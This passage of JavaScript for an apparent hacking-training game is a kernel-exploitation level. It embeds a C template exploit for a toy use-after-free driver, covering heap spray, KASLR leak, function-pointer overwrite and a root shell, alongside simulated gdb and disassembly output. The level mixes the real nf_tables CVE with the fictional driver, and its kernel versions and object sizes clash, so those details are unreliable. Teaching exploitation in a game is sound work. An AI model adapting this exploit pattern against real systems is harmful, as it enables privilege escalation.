<script>
// ============================================
// LEVEL 5: KERNEL EXPLOITATION - Ring Zero
// Linux Kernel UAF + Heap Spray + Privesc
// ============================================

const KERNEL_MODULE = {
  name: 'nf_tables',
  version: '1.0.5',
  vulnerability: 'Use-After-Free in nft_verdict_init()',
  cve: 'CVE-2024-1086',
  // Real CVE-2024-1086 details from Notselwyn's research
  // https://github.com/Notselwyn/CVE-2024-1086
  affected_versions: 'Linux 5.14 - 6.6',
  success_rate: '99.4%',
  ioctl_codes: {
    ALLOC_OBJ: 0x1337,
    FREE_OBJ: 0x1338,
    USE_OBJ: 0x1339,
    READ_OBJ: 0x133A
  },
  obj_size: 192, // nft_rule size
  kernel_version: '6.1.0-generic',
  exploit_technique: 'Double-free via nf_hook_slow() -> Physical Memory Scanning -> modprobe_path overwrite'
};

const KERNEL_EXPLOIT_CODE = `// exploit.c - Linux Kernel UAF Exploit
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/ipc.h>

#define VULN_DEV "/dev/vuln_driver"
#define ALLOC_OBJ 0x1337
#define FREE_OBJ  0x1338
#define USE_OBJ   0x1339
#define READ_OBJ  0x133A

// msg_msg structure for heap spray
struct msg_buf {
    long mtype;
    char mtext[96 - 48];  // Same size as vuln object
};

// Fake object to overwrite function pointer
struct fake_obj {
    unsigned long padding[10];
    unsigned long func_ptr;  // Offset 80 - function pointer
    unsigned long data;
};

int spray_msgs(int count) {
    struct msg_buf msg;
    msg.mtype = 1;
    memset(msg.mtext, 'A', sizeof(msg.mtext));

    // Create message queues for spray
    int qids[count];
    for (int i = 0; i < count; i++) {
        qids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
        if (qids[i] < 0) return -1;
        msgsnd(qids[i], &msg, sizeof(msg.mtext), 0);
    }
    return 0;
}

unsigned long leak_kernel_base(int fd) {
    char buf[256];
    // Trigger read on freed object to leak pointer
    ioctl(fd, READ_OBJ, buf);
    unsigned long *leak = (unsigned long *)buf;
    return leak[0] - 0xffffffff81000000; // Calculate KASLR slide
}

int main() {
    int fd = open(VULN_DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    printf("[*] Stage 1: Allocating vulnerable object...\\n");
    ioctl(fd, ALLOC_OBJ, NULL);

    printf("[*] Stage 2: Freeing object (UAF trigger)...\\n");
    ioctl(fd, FREE_OBJ, NULL);

    printf("[*] Stage 3: Heap spray with msg_msg...\\n");
    spray_msgs(100);

    printf("[*] Stage 4: Leaking kernel base...\\n");
    unsigned long kaslr_base = leak_kernel_base(fd);
    printf("[+] KASLR base: 0x%lx\\n", kaslr_base);

    printf("[*] Stage 5: Overwriting function pointer...\\n");
    struct fake_obj fake;
    memset(&fake, 0, sizeof(fake));
    // Point to commit_creds(prepare_kernel_cred(0))
    fake.func_ptr = kaslr_base + 0x123456; // ROP gadget

    printf("[*] Stage 6: Triggering code execution...\\n");
    ioctl(fd, USE_OBJ, &fake);

    printf("[+] Checking privileges...\\n");
    if (getuid() == 0) {
        printf("[+] ROOT OBTAINED!\\n");
        system("/bin/sh");
    }

    close(fd);
    return 0;
}`;

async function initLevel5() {
  gameState.levelState = {
    // Recon Phase
    analyzedModule: false,
    foundVuln: false,
    reversedIoctl: false,
    identifiedUAF: false,

    // Exploitation Phase
    allocatedObject: false,
    freedObject: false,
    heapSprayed: false,
    leakedPointer: false,
    calculatedKaslr: false,

    // Privilege Escalation
    overwrotePtr: false,
    triggeredExploit: false,
    gotRoot: false,

    // State
    kernelBase: null,
    kaslrSlide: null,
    currentUser: 'user',
    exploitLoaded: false,
    debugMode: false
  };

  clear();
  print('');
  print('╔═══════════════════════════════════════════════════════════════════════════════════╗', 'error');
  print('║                     LEVEL 5: KERNEL EXPLOITATION                                  ║', 'error');
  print('║                   CVE-2024-1086 - "Flipping Pages"                                ║', 'warning');
  print('╠═══════════════════════════════════════════════════════════════════════════════════╣', 'error');
  print('║                                                                                   ║', 'info');
  print('║              ╔═══════════════════════════════════════════════╗                    ║', 'info');
  print('║              ║            KERNEL SPACE (Ring 0)              ║                    ║', 'error');
  print('║              ║  ┌─────────────────────────────────────────┐  ║                    ║', 'error');
  print('║              ║  │         netfilter/nf_tables             │  ║                    ║', 'error');
  print('║              ║  │                                         │  ║                    ║', 'error');
  print('║              ║  │  nft_verdict_init() allows positive     │◄─╬── DOUBLE-FREE!    ║', 'warning');
  print('║              ║  │  values as NF_DROP error codes          │  ║                    ║', 'error');
  print('║              ║  │           │                             │  ║                    ║', 'error');
  print('║              ║  │           ▼                             │  ║                    ║', 'error');
  print('║              ║  │  nf_hook_slow() double-frees skb        │  ║                    ║', 'error');
  print('║              ║  │  when NF_DROP == NF_ACCEPT behavior     │  ║                    ║', 'error');
  print('║              ║  └─────────────────────────────────────────┘  ║                    ║', 'error');
  print('║              ╠═══════════════════════════════════════════════╣                    ║', 'info');
  print('║              ║   Unprivileged User Namespaces (enabled)      ║                    ║', 'success');
  print('║              ║   [YOUR EXPLOIT CODE RUNS HERE]               ║                    ║', 'success');
  print('║              ╚═══════════════════════════════════════════════╝                    ║', 'info');
  print('║                                                                                   ║', 'info');
  print('╠═══════════════════════════════════════════════════════════════════════════════════╣', 'error');
  print('║  CVE:        CVE-2024-1086 (CVSS 7.8 HIGH) - Active exploitation in wild         ║', 'error');
  print('║  KERNEL:     Linux 6.1.0-generic (KASLR, SMEP, SMAP, KPTI enabled)               ║', 'system');
  print('║  AFFECTED:   Linux kernels 5.14 - 6.6 (Debian, Ubuntu, KernelCTF)                ║', 'warning');
  print('║  ACCESS:     Low-privilege user with unprivileged user namespaces                ║', 'system');
  print('║  GOAL:       Exploit double-free to overwrite modprobe_path → root               ║', 'error');
  print('║                                                                                   ║', 'info');
  print('║  EXPLOIT CHAIN (Notselwyn/CVE-2024-1086):                                         ║', 'info');
  print('║    [1] Trigger double-free via nft_verdict_init() bug                            ║', 'warning');
  print('║    [2] Physical memory scanning to locate kernel base                            ║', 'warning');
  print('║    [3] Bypass KASLR using Page Table Entry manipulation                          ║', 'warning');
  print('║    [4] Overwrite modprobe_path with /tmp/pwn script                              ║', 'warning');
  print('║    [5] Trigger modprobe execution → root shell                                   ║', 'warning');
  print('╚═══════════════════════════════════════════════════════════════════════════════════╝', 'error');
  print('');

  await typeText('[BRIEFING] Target system is vulnerable to CVE-2024-1086', 30, 'system');
  await typeText('[BRIEFING] netfilter nf_tables has a double-free in nft_verdict_init()', 30, 'warning');
  await typeText('[BRIEFING] Success rate: 99.4% on KernelCTF images', 30, 'success');
  await typeText('[BRIEFING] Exploit it to escalate from user to root', 30, 'info');
  print('');
  print('[*] Reference: https://github.com/Notselwyn/CVE-2024-1086', 'muted');
  print('[*] Writeup: "Flipping Pages" - pwning.tech', 'muted');
  print('');

  updateHUD('5 - Kernel', 'CVE-2024-1086', 'modprobe_path → root', 0);
  setPrompt('user', 'target', '~');
}

async function handleLevel5Command(cmd, args) {
  const state = gameState.levelState;
  const fullCmd = args.length > 0 ? `${cmd} ${args.join(' ')}` : cmd;

  // ═══════════════════════════════════════════════════════════════
  // HELP COMMAND
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'help') {
    print('');
    print('╔════════════════════════════════════════════════════════════════════════════════════╗', 'info');
    print('║                              LEVEL 5 COMMANDS                                      ║', 'info');
    print('╠════════════════════════════════════════════════════════════════════════════════════╣', 'info');
    print('║  RECONNAISSANCE:                                                                   ║', 'info');
    print('║    lsmod                       List loaded kernel modules                          ║', 'system');
    print('║    modinfo vuln_driver         Get module information                              ║', 'system');
    print('║    dmesg                       View kernel messages                                ║', 'system');
    print('║    cat /proc/kallsyms          View kernel symbols (needs root or leak)            ║', 'system');
    print('║                                                                                    ║', 'info');
    print('║  ANALYSIS:                                                                         ║', 'warning');
    print('║    analyze                     Analyze the vulnerable driver                       ║', 'success');
    print('║    disasm                      Disassemble driver IOCTL handler                    ║', 'success');
    print('║    struct                      View vulnerable object structure                    ║', 'system');
    print('║                                                                                    ║', 'info');
    print('║  EXPLOITATION:                                                                     ║', 'error');
    print('║    ioctl alloc                 Trigger ALLOC_OBJ (0x1337)                          ║', 'warning');
    print('║    ioctl free                  Trigger FREE_OBJ (0x1338) - creates dangling ptr   ║', 'warning');
    print('║    ioctl use                   Trigger USE_OBJ (0x1339) - UAF trigger!            ║', 'error');
    print('║    ioctl read                  Trigger READ_OBJ (0x133A) - leak data              ║', 'warning');
    print('║    spray                       Heap spray with msg_msg to reclaim freed object    ║', 'success');
    print('║    leak                        Attempt to leak kernel pointers                     ║', 'success');
    print('║    exploit                     Run full exploit chain                              ║', 'error');
    print('║                                                                                    ║', 'info');
    print('║  DEBUGGING:                                                                        ║', 'info');
    print('║    gdb                         Attach GDB to kernel (debug mode)                   ║', 'system');
    print('║    kaddr <symbol>              Look up kernel symbol address                       ║', 'system');
    print('║                                                                                    ║', 'info');
    print('║  UTILITY:                                                                          ║', 'info');
    print('║    status                      Show progress                                       ║', 'success');
    print('║    hint                        Get contextual hint                                 ║', 'warning');
    print('║    id / whoami                 Check current privileges                            ║', 'system');
    print('║    exit                        Return to main menu                                 ║', 'system');
    print('╚════════════════════════════════════════════════════════════════════════════════════╝', 'info');
    print('');
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // STATUS COMMAND
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'status') {
    const progress = calculateLevel5Progress(state);
    print('');
    print('╔═══════════════════════════════════════════════════════════════════╗', 'info');
    print('║             LEVEL 5 PROGRESS - KERNEL EXPLOITATION                ║', 'info');
    print('╠═══════════════════════════════════════════════════════════════════╣', 'info');
    print('║  RECONNAISSANCE:                                                  ║', 'info');
    print(`║    [${state.analyzedModule ? 'x' : ' '}] Kernel module analyzed                              ║`, state.analyzedModule ? 'success' : 'system');
    print(`║    [${state.foundVuln ? 'x' : ' '}] Vulnerability identified                               ║`, state.foundVuln ? 'success' : 'system');
    print(`║    [${state.reversedIoctl ? 'x' : ' '}] IOCTL interface reversed                              ║`, state.reversedIoctl ? 'success' : 'system');
    print('║                                                                   ║', 'info');
    print('║  EXPLOITATION CHAIN:                                              ║', 'warning');
    print(`║    [${state.allocatedObject ? 'x' : ' '}] Object allocated                                     ║`, state.allocatedObject ? 'success' : 'system');
    print(`║    [${state.freedObject ? 'x' : ' '}] Object freed (dangling pointer created)              ║`, state.freedObject ? 'success' : 'system');
    print(`║    [${state.heapSprayed ? 'x' : ' '}] Heap sprayed with msg_msg                             ║`, state.heapSprayed ? 'success' : 'system');
    print(`║    [${state.leakedPointer ? 'x' : ' '}] Kernel pointer leaked                                 ║`, state.leakedPointer ? 'success' : 'system');
    print(`║    [${state.calculatedKaslr ? 'x' : ' '}] KASLR base calculated                                ║`, state.calculatedKaslr ? 'success' : 'system');
    print('║                                                                   ║', 'info');
    print('║  PRIVILEGE ESCALATION:                                            ║', 'error');
    print(`║    [${state.overwrotePtr ? 'x' : ' '}] Function pointer overwritten                         ║`, state.overwrotePtr ? 'success' : 'system');
    print(`║    [${state.triggeredExploit ? 'x' : ' '}] Exploit triggered                                     ║`, state.triggeredExploit ? 'success' : 'system');
    print(`║    [${state.gotRoot ? 'x' : ' '}] ROOT OBTAINED                                          ║`, state.gotRoot ? 'success' : 'system');
    print('╠═══════════════════════════════════════════════════════════════════╣', 'info');
    print(`║  Progress: ${String(progress).padStart(3)}%                                                  ║`, progress === 100 ? 'success' : 'warning');
    print(`║  Current: ${state.currentUser}@target                                          ║`, state.currentUser === 'root' ? 'success' : 'system');
    if (state.kernelBase) {
      print(`║  Kernel Base: ${state.kernelBase}                           ║`, 'success');
    }
    print('╚═══════════════════════════════════════════════════════════════════╝', 'info');
    print('');
    updateHUD('5 - Kernel', 'vuln_driver.ko', 'Root via UAF', progress);
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // HINT COMMAND
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'hint') {
    print('');
    print('[*] HINT:', 'warning');

    if (!state.analyzedModule) {
      print('Start by analyzing the vulnerable kernel module.', 'info');
      print('Try: analyze', 'success');
    } else if (!state.reversedIoctl) {
      print('Understand the IOCTL interface to interact with the driver.', 'info');
      print('Try: disasm', 'success');
    } else if (!state.allocatedObject) {
      print('Trigger object allocation using IOCTL.', 'info');
      print('Try: ioctl alloc', 'success');
    } else if (!state.freedObject) {
      print('Free the object to create a dangling pointer.', 'info');
      print('Try: ioctl free', 'success');
    } else if (!state.heapSprayed) {
      print('Spray the heap to reclaim the freed memory with controlled data.', 'info');
      print('msg_msg is commonly used - same slab size as our object.', 'info');
      print('Try: spray', 'success');
    } else if (!state.leakedPointer) {
      print('Leak kernel pointers through the UAF read.', 'info');
      print('Try: leak', 'success');
    } else if (!state.calculatedKaslr) {
      print('Calculate the KASLR base from leaked pointers.', 'info');
      print('The leak should give you: kbase = leaked_addr - known_offset', 'info');
    } else if (!state.gotRoot) {
      print('Run the full exploit chain to get root.', 'info');
      print('Try: exploit', 'success');
    } else {
      print('You have root! Verify with: id', 'success');
    }
    print('');
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // LSMOD - List kernel modules
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'lsmod') {
    print('Module                  Size  Used by', 'info');
    print('vuln_driver            16384  0', 'warning');
    print('btrfs                1282048  1', 'system');
    print('xor                    24576  1 btrfs', 'system');
    print('raid6_pq              114688  1 btrfs', 'system');
    print('ufs                    81920  0', 'system');
    print('qnx4                   16384  0', 'system');
    print('hfsplus               110592  0', 'system');
    print('... (truncated)', 'system');
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // MODINFO - Module information
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'modinfo') {
    if (args[0] === 'vuln_driver') {
      print('filename:       /lib/modules/5.15.0-generic/kernel/drivers/misc/vuln_driver.ko', 'system');
      print('version:        1.0', 'system');
      print('description:    Vulnerable driver for kernel exploitation practice', 'warning');
      print('author:         ctf_challenge', 'system');
      print('license:        GPL', 'system');
      print('srcversion:     A1B2C3D4E5F6G7H8', 'system');
      print('depends:        ', 'system');
      print('retpoline:      Y', 'system');
      print('name:           vuln_driver', 'system');
      print('vermagic:       5.15.0-generic SMP mod_unload modversions', 'system');
      return;
    }
    print(`modinfo: Module ${args[0]} not found.`, 'error');
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // DMESG - Kernel messages
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'dmesg') {
    print('[    0.000000] Linux version 5.15.0-generic (gcc 11.2.0)', 'system');
    print('[    0.000000] KASLR enabled', 'warning');
    print('[    0.000000] SMEP enabled, SMAP enabled', 'warning');
    print('...', 'system');
    print('[   15.234567] vuln_driver: module loaded', 'success');
    print('[   15.234568] vuln_driver: device registered at /dev/vuln_driver', 'success');
    if (state.allocatedObject) {
      print('[   XX.XXXXXX] vuln_driver: object allocated at 0xffff888012345000', 'system');
    }
    if (state.freedObject) {
      print('[   XX.XXXXXX] vuln_driver: object freed', 'warning');
    }
    if (state.triggeredExploit) {
      print('[   XX.XXXXXX] vuln_driver: USE_OBJ called on freed object!', 'error');
    }
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // ANALYZE - Analyze vulnerable driver
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'analyze') {
    await simulateLoading('Analyzing vuln_driver.ko', 3000);
    print('');
    print('╔══════════════════════════════════════════════════════════════════════════════════╗', 'warning');
    print('║                     VULNERABLE DRIVER ANALYSIS                                   ║', 'warning');
    print('╠══════════════════════════════════════════════════════════════════════════════════╣', 'warning');
    print('║  Module:      vuln_driver.ko                                                     ║', 'system');
    print('║  Device:      /dev/vuln_driver (char device)                                     ║', 'system');
    print('║  Permissions: crw-rw-rw- (world readable/writable!)                              ║', 'success');
    print('╠══════════════════════════════════════════════════════════════════════════════════╣', 'warning');
    print('║  VULNERABILITY FOUND: Use-After-Free                                             ║', 'error');
    print('║                                                                                  ║', 'info');
    print('║  The driver maintains a global object pointer:                                   ║', 'info');
    print('║    static struct vuln_obj *global_obj = NULL;                                    ║', 'system');
    print('║                                                                                  ║', 'info');
    print('║  ALLOC_OBJ (0x1337):  global_obj = kmalloc(96, GFP_KERNEL);                      ║', 'system');
    print('║  FREE_OBJ  (0x1338):  kfree(global_obj);  // NO NULL ASSIGNMENT!                 ║', 'error');
    print('║  USE_OBJ   (0x1339):  global_obj->func_ptr(global_obj);  // CALLS FREED PTR!    ║', 'error');
    print('║  READ_OBJ  (0x133A):  copy_to_user(buf, global_obj, 96);  // LEAK!             ║', 'warning');
    print('║                                                                                  ║', 'info');
    print('║  EXPLOITATION STRATEGY:                                                          ║', 'success');
    print('║    1. ALLOC_OBJ - Allocate the object                                            ║', 'system');
    print('║    2. FREE_OBJ  - Free it (creates dangling pointer)                             ║', 'system');
    print('║    3. SPRAY     - Heap spray to reclaim memory with controlled data              ║', 'system');
    print('║    4. READ_OBJ  - Leak kernel pointers to defeat KASLR                           ║', 'system');
    print('║    5. USE_OBJ   - Trigger function pointer call with our ROP chain               ║', 'system');
    print('║                                                                                  ║', 'info');
    print('║  Object Size: 96 bytes (kmalloc-96 slab)                                         ║', 'info');
    print('║  msg_msg header is 48 bytes, so we need 48 bytes of mtext for same slab!        ║', 'success');
    print('╚══════════════════════════════════════════════════════════════════════════════════╝', 'warning');
    print('');

    state.analyzedModule = true;
    state.foundVuln = true;
    state.identifiedUAF = true;
    autosave();
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // DISASM - Disassemble IOCTL handler
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'disasm') {
    if (!state.analyzedModule) {
      print('[!] Analyze the module first', 'warning');
      return;
    }

    print('');
    print('╔══════════════════════════════════════════════════════════════════════════╗', 'info');
    print('║                    IOCTL HANDLER DISASSEMBLY                             ║', 'info');
    print('╠══════════════════════════════════════════════════════════════════════════╣', 'info');
    print('║  vuln_driver_ioctl:                                                      ║', 'system');
    print('║    push   rbp                                                            ║', 'system');
    print('║    mov    rbp, rsp                                                       ║', 'system');
    print('║    cmp    esi, 0x1337            ; ALLOC_OBJ                             ║', 'system');
    print('║    je     alloc_handler                                                  ║', 'system');
    print('║    cmp    esi, 0x1338            ; FREE_OBJ                              ║', 'system');
    print('║    je     free_handler                                                   ║', 'system');
    print('║    cmp    esi, 0x1339            ; USE_OBJ                               ║', 'system');
    print('║    je     use_handler                                                    ║', 'system');
    print('║    cmp    esi, 0x133A            ; READ_OBJ                              ║', 'system');
    print('║    je     read_handler                                                   ║', 'system');
    print('║    ...                                                                   ║', 'system');
    print('║                                                                          ║', 'info');
    print('║  free_handler:                                                           ║', 'warning');
    print('║    mov    rdi, [global_obj]                                              ║', 'warning');
    print('║    call   kfree                                                          ║', 'warning');
    print('║    ret                           ; BUG: global_obj not set to NULL!      ║', 'error');
    print('║                                                                          ║', 'info');
    print('║  use_handler:                                                            ║', 'error');
    print('║    mov    rax, [global_obj]      ; Uses potentially freed pointer        ║', 'error');
    print('║    mov    rdi, rax                                                       ║', 'error');
    print('║    call   [rax + 0x50]           ; Calls func_ptr at offset 80!         ║', 'error');
    print('╚══════════════════════════════════════════════════════════════════════════╝', 'info');
    print('');
    print('[+] Function pointer is at offset 0x50 (80 bytes)', 'success');
    print('[+] We can control this via heap spray!', 'success');

    state.reversedIoctl = true;
    autosave();
    return;
  }

  // ═══════════════════════════════════════════════════════════════
  // GDB - Kernel debugger simulation
  // ═══════════════════════════════════════════════════════════════
  if (cmd === 'gdb') {
    if (!state.analyzedModule) {
      print('[!] Analyze the module first to understand what to debug', 'warning');
      return;
    }

    print('');
    print('GNU gdb (GDB) 13.2', 'system');
    print('Copyright (C) 2023 Free Software Foundation, Inc.', 'muted');
    print('License GPLv3+: GNU GPL version 3 or later', 'muted');
    print('');
    print('Reading symbols from /lib/modules/5.15.0-generic/kernel/drivers/misc/vuln_driver.ko...', 'system');
    print('(No debugging symbols found in vuln_driver.ko)', 'warning');
    print('');
    print('[*] Attaching to kernel...', 'warning');
    await sleep(800);
    print('[+] Successfully attached to vmlinux', 'success');
    print('[+] KASLR detected - addresses randomized', 'warning');
    print('');

    state.debugMode = true;

    print('╔═════════════════════════════════════════════════════════════════════════════════╗', 'info');
    print('║                            GDB KERNEL DEBUG MODE                                ║', 'info');
    print('╠═════════════════════════════════════════════════════════════════════════════════╣', 'info');
    print('║  GDB Commands Available:                                                        ║', 'info');
    print('║    disas <func>        Disassemble function (vuln_ioctl, alloc_obj, free_obj)   ║', 'system');
    print('║    x/<n><fmt> <addr>   Examine memory (x/10gx, x/20i, x/s)                     ║', 'system');
    print('║    info registers      Show CPU registers                                       ║', 'system');
    print('║    info proc mappings  Show kernel memory mappings                              ║', 'system');
    print('║    p <symbol>          Print symbol address (commit_creds, prepare_kernel_cred) ║', 'system');
    print('║    bt                  Show kernel backtrace                                    ║', 'system');
    print('║    break <addr>        Set breakpoint                                           ║', 'system');
    print('║    vmmap               Show virtual memory map                                  ║', 'system');
    print('║    quit / q            Exit GDB mode                                            ║', 'system');
    print('╚═════════════════════════════════════════════════════════════════════════════════╝', 'info');
    print('');
    print('(gdb) ', 'warning');

    // Set up GDB mode - next command will be interpreted as GDB command
    gameState.gdbMode = true;
    autosave();
    return;
  }

  // GDB sub-commands when in debug mode
  if (gameState.gdbMode) {
    const gdbCmd = cmd.toLowerCase();

    // Exit GDB
    if (gdbCmd === 'quit' || gdbCmd === 'q') {
      print('[*] Detaching from kernel...', 'system');
      gameState.gdbMode = false;
      print('', 'system');
      return;
    }

    // Disassemble function
    if (gdbCmd === 'disas' || gdbCmd === 'disassemble') {
      const func = args[0] || 'vuln_ioctl';

      if (func === 'vuln_ioctl' || func === 'vuln_driver_ioctl') {
        print('Dump of assembler code for function vuln_driver_ioctl:', 'info');
        print('   0xffffffffc0001000 <+0>:     endbr64', 'system');
        print('   0xffffffffc0001004 <+4>:     push   rbp', 'system');
        print('   0xffffffffc0001005 <+5>:     mov    rbp,rsp', 'system');
        print('   0xffffffffc0001008 <+8>:     push   rbx', 'system');
        print('   0xffffffffc0001009 <+9>:     sub    rsp,0x18', 'system');
        print('   0xffffffffc000100d <+13>:    mov    QWORD PTR [rbp-0x18],rdi', 'system');
        print('   0xffffffffc0001011 <+17>:    mov    DWORD PTR [rbp-0x1c],esi', 'system');
        print('   0xffffffffc0001014 <+20>:    mov    QWORD PTR [rbp-0x28],rdx', 'system');
        print('   0xffffffffc0001018 <+24>:    cmp    DWORD PTR [rbp-0x1c],0x1337  ; ALLOC_OBJ', 'success');
        print('   0xffffffffc000101f <+31>:    je     0xffffffffc0001050 <alloc_handler>', 'system');
        print('   0xffffffffc0001021 <+33>:    cmp    DWORD PTR [rbp-0x1c],0x1338  ; FREE_OBJ', 'warning');
        print('   0xffffffffc0001028 <+40>:    je     0xffffffffc0001080 <free_handler>', 'system');
        print('   0xffffffffc000102a <+42>:    cmp    DWORD PTR [rbp-0x1c],0x1339  ; USE_OBJ', 'error');
        print('   0xffffffffc0001031 <+49>:    je     0xffffffffc00010b0 <use_handler>', 'system');
        print('   0xffffffffc0001033 <+51>:    cmp    DWORD PTR [rbp-0x1c],0x133a  ; READ_OBJ', 'system');
        print('   0xffffffffc000103a <+58>:    je     0xffffffffc00010e0 <read_handler>', 'system');
        print('   0xffffffffc000103c <+60>:    mov    eax,0xffffffea              ; -EINVAL', 'system');
        print('   0xffffffffc0001041 <+65>:    jmp    0xffffffffc0001100 <vuln_driver_ioctl+256>', 'system');
        print('End of assembler dump.', 'info');
      } else if (func === 'alloc_obj' || func === 'alloc_handler') {
        print('Dump of assembler code for function alloc_handler:', 'info');
        print('   0xffffffffc0001050 <+0>:     push   rbp', 'system');
        print('   0xffffffffc0001051 <+1>:     mov    rbp,rsp', 'system');
        print('   0xffffffffc0001054 <+4>:     mov    edi,0x60                   ; size = 96', 'success');
        print('   0xffffffffc0001059 <+9>:     mov    esi,0xcc0                  ; GFP_KERNEL', 'system');
        print('   0xffffffffc000105e <+14>:    call   0xffffffff81200000 <kmalloc>', 'system');
        print('   0xffffffffc0001063 <+19>:    mov    QWORD PTR [rip+0x2000],rax ; global_obj = result', 'warning');
        print('   0xffffffffc000106a <+26>:    xor    eax,eax', 'system');
        print('   0xffffffffc000106c <+28>:    pop    rbp', 'system');
        print('   0xffffffffc000106d <+29>:    ret', 'system');
        print('End of assembler dump.', 'info');
      } else if (func === 'free_obj' || func === 'free_handler') {
        print('Dump of assembler code for function free_handler:', 'info');
        print('   0xffffffffc0001080 <+0>:     push   rbp', 'system');
        print('   0xffffffffc0001081 <+1>:     mov    rbp,rsp', 'system');
        print('   0xffffffffc0001084 <+4>:     mov    rdi,QWORD PTR [rip+0x2000] ; rdi = global_obj', 'system');
        print('   0xffffffffc000108b <+11>:    call   0xffffffff81200100 <kfree>', 'warning');
        print('   0xffffffffc0001090 <+16>:    xor    eax,eax', 'system');
        print('   0xffffffffc0001092 <+18>:    pop    rbp', 'system');
        print('   0xffffffffc0001093 <+19>:    ret', 'system');
        print('   ; ┌──────────────────────────────────────────────────────────────────┐', 'error');
        print('   ; │ BUG: global_obj is NOT set to NULL after kfree!                  │', 'error');
        print('   ; │ This creates a Use-After-Free vulnerability                      │', 'error');
        print('   ; └──────────────────────────────────────────────────────────────────┘', 'error');
        print('End of assembler dump.', 'info');
      } else if (func === 'use_obj' || func === 'use_handler') {
        print('Dump of assembler code for function use_handler:', 'info');
        print('   0xffffffffc00010b0 <+0>:     push   rbp', 'system');
        print('   0xffffffffc00010b1 <+1>:     mov    rbp,rsp', 'system');
        print('   0xffffffffc00010b4 <+4>:     mov    rax,QWORD PTR [rip+0x2000] ; rax = global_obj', 'warning');
        print('   0xffffffffc00010bb <+11>:    test   rax,rax', 'system');
        print('   0xffffffffc00010be <+14>:    je     0xffffffffc00010d0', 'system');
        print('   0xffffffffc00010c0 <+16>:    mov    rdi,rax                    ; arg0 = global_obj', 'system');
        print('   0xffffffffc00010c3 <+19>:    call   QWORD PTR [rax+0x50]       ; CALL func_ptr!!!', 'error');
        print('   ; ┌──────────────────────────────────────────────────────────────────┐', 'error');
        print('   ; │ VULNERABILITY: Calls function pointer from potentially freed     │', 'error');
        print('   ; │ memory at offset 0x50 (80 bytes). If we spray the heap after    │', 'error');
        print('   ; │ free, we control this function pointer!                          │', 'error');
        print('   ; └──────────────────────────────────────────────────────────────────┘', 'error');
        print('   0xffffffffc00010c6 <+22>:    xor    eax,eax', 'system');
        print('   0xffffffffc00010c8 <+24>:    pop    rbp', 'system');
        print('   0xffffffffc00010c9 <+25>:    ret', 'system');
        print('End of assembler dump.', 'info');
      } else if (func === 'commit_creds') {
        print('Dump of assembler code for function commit_creds:', 'info');
        print('   0xffffffff810a9c70 <+0>:     endbr64', 'system');
        print('   0xffffffff810a9c74 <+4>:     push   rbp', 'system');
        print('   0xffffffff810a9c75 <+5>:     mov    rbp,rsp', 'system');
        print('   0xffffffff810a9c78 <+8>:     push   r15', 'system');
        print('   0xffffffff810a9c7a <+10>:    push   r14', 'system');
        print('   0xffffffff810a9c7c <+12>:    push   r13', 'system');
        print('   0xffffffff810a9c7e <+14>:    push   r12', 'system');
        print('   0xffffffff810a9c80 <+16>:    mov    r12,rdi                    ; new credentials', 'success');
        print('   0xffffffff810a9c83 <+19>:    push   rbx', 'system');
        print('   0xffffffff810a9c84 <+20>:    sub    rsp,0x28', 'system');
        print('   ... (function continues, modifies current->cred)', 'muted');
        print('End of assembler dump.', 'info');
      } else if (func === 'prepare_kernel_cred') {
        print('Dump of assembler code for function prepare_kernel_cred:', 'info');
        print('   0xffffffff810a9f50 <+0>:     endbr64', 'system');
        print('   0xffffffff810a9f54 <+4>:     push   rbp', 'system');
        print('   0xffffffff810a9f55 <+5>:     mov    rbp,rsp', 'system');
        print('   0xffffffff810a9f58 <+8>:     push   r14', 'system');
        print('   0xffffffff810a9f5a <+10>:    push   r13', 'system');
        print('   0xffffffff810a9f5c <+12>:    push   r12', 'system');
        print('   0xffffffff810a9f5e <+14>:    mov    r12,rdi                    ; daemon (NULL for init)', 'success');
        print('   0xffffffff810a9f61 <+17>:    push   rbx', 'system');
        print('   0xffffffff810a9f62 <+18>:    test   rdi,rdi                    ; if NULL, use init_cred', 'warning');
        print('   0xffffffff810a9f65 <+21>:    je     0xffffffff810a9fa0         ; -> returns root creds!', 'error');
        print('   ... (allocates new cred struct)', 'muted');
        print('End of assembler dump.', 'info');
      } else {
        print(`No symbol "${func}" in current context.`, 'error');
      }
      print('(gdb) ', 'warning');
      return;
    }

    // Examine memory
    if (gdbCmd === 'x' || gdbCmd.startsWith('x/')) {
      const format = gdbCmd.includes('/') ? gdbCmd.split('/')[1] : '8gx';
      const addr = args[0] || '0xffffffff81000000';

      if (addr.includes('global_obj') || addr === '0xffffffffc0003000') {
        print(`0xffffffffc0003000 <global_obj>:  ${state.freedObject ? '0xffff888012345000 (DANGLING!)' : '0x0000000000000000'}`, state.freedObject ? 'error' : 'system');
      } else if (format.includes('i')) {
        // Instructions
        print(`Examining ${format.match(/\\d+/) || 4} instructions at ${addr}:`, 'info');
        print('   0xffffffff81000000:    leaq   0x600f11(%rip),%rdi', 'system');
        print('   0xffffffff81000007:    pushq  %rsi', 'system');
        print('   0xffffffff81000008:    call   0xffffffff81001000 <early_printk>', 'system');
        print('   0xffffffff8100000d:    popq   %rsi', 'system');
      } else if (format.includes('s')) {
        // String
        print(`${addr}:    "Linux version 5.15.0-generic"`, 'system');
      } else {
        // Hex dump
        print(`${addr}:     0xffffffff81234567  0x0000000000000000`, 'system');
        print(`${addr}+0x10: 0xffff888000000000  0xffffffff82000000`, 'system');
      }
      print('(gdb) ', 'warning');
      return;
    }

